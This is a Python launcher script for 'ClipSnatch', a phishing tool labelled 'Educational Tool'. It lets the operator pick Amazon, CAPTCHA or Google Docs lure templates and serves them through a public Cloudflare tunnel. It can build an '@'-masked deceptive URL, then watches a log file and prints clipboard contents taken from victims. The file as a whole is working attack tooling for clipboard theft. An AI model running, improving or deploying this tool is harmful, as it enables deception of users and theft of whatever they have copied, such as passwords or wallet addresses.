import os
import subprocess
import signal
import platform
import urllib.request
import stat
from time import sleep
import threading
import re

def check_or_install_cloudflared():
    # Step 1: Check if cloudflared is globally installed
    try:
        subprocess.run(["cloudflared", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[✔] Cloudflared is already installed system-wide.")
        return "cloudflared"
    except FileNotFoundError:
        print("[!] Cloudflared not found globally.")

    # Step 2: Check for local cloudflared binary
    local_binary = "./cloudflared"
    if os.path.isfile(local_binary):
        print("[✔] Found local cloudflared binary.")
        return local_binary

    # Step 3: Download cloudflared binary
    print("[+] Downloading Cloudflared...")

    system = platform.system().lower()
    arch = platform.machine()

    # Normalize architecture
    if arch == "x86_64":
        arch = "amd64"
    elif arch in ["arm64", "aarch64"]:
        arch = "arm64"
    else:
        print(f"[✘] Unsupported architecture: {arch}")
        exit(1)

    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
    try:
        urllib.request.urlretrieve(url, local_binary)
        os.chmod(local_binary, os.stat(local_binary).st_mode | stat.S_IEXEC)
        print(f"[✔] Downloaded cloudflared: {local_binary}")
        return local_binary
    except Exception as e:
        print(f"[✘] Failed to download cloudflared: {e}")
        exit(1)

cloudflared_path = check_or_install_cloudflared()


def banner():
    os.system("clear")
    print(r"""


 ██████╗██╗     ██╗██████╗     ███████╗███╗   ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
██╔════╝██║     ██║██╔══██╗    ██╔════╝████╗  ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
██║     ██║     ██║██████╔╝    ███████╗██╔██╗ ██║███████║   ██║   ██║     ███████║
██║     ██║     ██║██╔═══╝     ╚════██║██║╚██╗██║██╔══██║   ██║   ██║     ██╔══██║
╚██████╗███████╗██║██║         ███████║██║ ╚████║██║  ██║   ██║   ╚██████╗██║  ██║
 ╚═════╝╚══════╝╚═╝╚═╝         ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                                                  
       🧪 Educational Tool - ClipSnatch 🧪
""")

def choose_template():
    print("\n[+] Select a phishing template:")
    print("1. Amazon Gift Card")
    print("2. CAPTCHA Verification")
    print("3. Google Docs Access")
    choice = input(">> Enter choice [1-3]: ").strip()
    return choice

def dns_masking():
    mask = input("\n[?] Do you want to enable DNS masking (works less usually)? [y/N]: ").strip().lower()
    if mask == 'y':
        domain = input(">> Enter custom domain (https://example.com): ").strip()
        return domain
    return None

def tail_clipboard_log():
    print("\n[🔎] Waiting for clipboard data from victim...\n")
    logfile = "logs.txt"
    open(logfile, 'a').close()  # Ensure file exists

    with open(logfile, "r") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if line:
                print(f"[📋] Clipboard Data: {line.strip()}")

def extract_cloudflared_url(output_line):
    match = re.search(r"https://[a-z0-9\-]+\.trycloudflare\.com", output_line)
    if match:
        return match.group(0)
    return None

def launch_server(template, masked_domain):
    os.environ["FLASK_TEMPLATE"] = template

    flask_proc = subprocess.Popen(
        ["python3", "server.py"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    sleep(2)

    try:
        cloudflared = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True
        )

        print("\n[+] Cloudflared tunnel started. Waiting for public URL...\n")
        public_url = None

        for line in cloudflared.stdout:
            if "trycloudflare.com" in line:
                possible_url = extract_cloudflared_url(line)
                if possible_url:
                    public_url = possible_url
                    break

        if public_url:
            print(f"[🔗] Normal URL: \033[1m{public_url}\033[0m")
            if masked_domain:
                print(f"[🎭] Masked URL: \033[1m{masked_domain}@{public_url.replace('https://', '')}\033[0m")
        else:
            print("[❌] Failed to extract public Cloudflared URL.")

        # Start clipboard log tailing in background
        threading.Thread(target=tail_clipboard_log, daemon=True).start()

        cloudflared.wait()

    except KeyboardInterrupt:
        print("\n[!] Interrupted. Shutting down servers.")
        flask_proc.send_signal(signal.SIGINT)
        cloudflared.terminate()

if __name__ == "__main__":
    banner()
    choice = choose_template()
    domain = dns_masking()
    template_map = {
        '1': "amazon.html",
        '2': "captcha.html",
        '3': "googledoc.html"
    }
    selected = template_map.get(choice, "amazon.html")
    launch_server(selected, domain)
